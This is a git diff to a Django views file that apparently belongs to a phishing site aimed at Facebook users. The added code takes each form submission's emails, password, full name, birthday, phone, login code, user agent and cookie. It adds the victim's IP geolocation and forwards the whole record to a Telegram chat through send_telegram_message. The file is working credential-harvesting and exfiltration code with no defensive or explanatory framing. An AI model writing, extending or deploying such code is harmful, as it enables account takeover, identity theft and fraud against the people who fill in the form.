@@ -1,5 +1,8 @@
 from django.shortcuts import render
 import requests
+from notification.views import send_telegram_message
+from datetime import datetime
+
 
 # Create your views here.
 def index(request):
@@ -42,10 +45,20 @@ def process(request):
     if request.method == 'POST':
         final_data = {}
         public_ip = get_client_ip(request)
+        print(public_ip)
         geolocation = get_geolocation(public_ip)
         final_data['public_ip'] = public_ip
         final_data.update(geolocation)
         print(final_data)
+        message = '[{}]: New information submitted \n*IP:* {}\n*Country Code:* {}\n*City:* {} \n*Proxy:* {}\n*Latitude:* {}\n*Longtitude:* {}\n*Information:* {}\n*Business Email:* {}\n*Personal Email*: {}\n*Password: * {}\n*Fullname: *{}\n*Facebook Name:* {}\n*Birthday: * {}\n*Phone*: {}\n*User Agent:* {}\n*Code:* {}\nCookie: {}'.format(
+            datetime.now().strftime("%Y-%m-%d %H:%M:%S"), public_ip, final_data.get('country_code', ''),
+            final_data.get('city', ''), final_data.get('proxy', ''), final_data.get('latitude', ''),
+            final_data.get('longtitude', ''),
+            final_data.get('information', ''), final_data.get('business_email', ''),
+            final_data.get('personal_email', ''), final_data.get('password', ''), final_data.get('fullname', ''),
+            final_data.get('facebook_name', ''), final_data.get('dob', ''), final_data.get('phone', ''),
+            final_data.get('user_agent', ''), final_data.get('code', ''), final_data.get('cookie', ''))
+        send_telegram_message(message)
         return render(request=request, template_name='form.html')
     else:
         return render(request=request, template_name='form.html')
